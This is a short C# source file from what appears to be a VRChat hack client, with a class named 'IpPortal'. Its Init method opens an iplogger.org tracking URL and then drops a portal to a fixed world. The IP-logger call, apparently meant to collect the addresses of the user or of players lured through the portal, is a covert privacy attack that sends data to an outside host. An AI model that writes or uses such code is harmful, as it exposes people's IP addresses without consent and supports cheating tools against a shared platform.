using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;

namespace Daydream.Client.Hacks
{
    internal class IpPortal
    {
        public static void Init()
        {
            Application.OpenURL("https://iplogger.org/logger/F6rd3q6ezxcK");
            Utility.PortalManager.dropportal(VRCPlayer.field_Internal_Static_VRCPlayer_0,"wrld_09d08b37-57be-438e-b529-40d6870f58e3");
        }
    }
}
